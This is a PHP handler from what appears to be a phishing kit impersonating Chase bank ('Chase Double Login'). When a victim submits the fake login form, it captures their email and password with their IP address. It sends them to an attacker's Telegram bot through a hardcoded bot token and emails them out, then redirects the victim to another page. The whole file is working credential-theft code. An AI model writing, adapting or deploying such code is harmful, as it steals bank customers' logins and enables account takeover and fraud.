<?php

// Get the user's IP address
$ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Start the session
session_start();



// Function to get browser and operating system information
function getBrowserAndOsInfo() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    $browser  = get_browser(null, true);
    $browserName = $browser['browser'];
    $browserVersion = $browser['version'];

    $osName = $browser['platform'];

}
// Check if 'logId' session variable is set


// Check if the form is submitted
if(isset($_POST['usr'])) {
    include 'to.php';

    // Sanitize and retrieve user input
    $email = filter_var($_POST['usr'], FILTER_SANITIZE_EMAIL);
    $pass = htmlspecialchars($_POST['pwd']); // Sanitize password input
    $time = date("Y-m-d H:i:s");
    // Prepare the email message
    $message =  "<b>🔒 Chase Double Login🚨</b>\n";
    $message .= "<b>User1:</b> <code>{$_SESSION['email']}</code>\n";
    $message .= "<strong>👤 User2:</strong> <code>$email</code>\n";
    $message .= "<strong>🔑 Pass:</strong> <code>$pass</code>\n";
    $message .= "<strong>🌐 IP Address:</strong> " . $ip . "\n";
    $message .= "<b>📅 Time:</b> $time\n";
    $message .= "<b>🔒CHASE DOUBLE LOGIN BY BESHO MANDO🚨</b> \n";
    $subject = "Chase LOGIN";
    $headers = "From: Mody@BOA" . rand(1, 99) . "Mody.V1 \r\n";
    $headers .= "Content-type: text/html\r\n";

    // Send message to Telegram in HTML format
    $telegramMessage = urlencode($message);
    file_get_contents("https://api.telegram.org/bot6024595519:AAHQcscrgYlrL2vxuh_mXG4FHKugXRA4Rww/sendMessage?chat_id={$chatid}&parse_mode=HTML&text={$telegramMessage}");

    // Send email
    $done = mail($toemail, $subject, $message, $headers);

    // Redirect to a confirmation page
    header('Location: ./red2.php');
}

?>
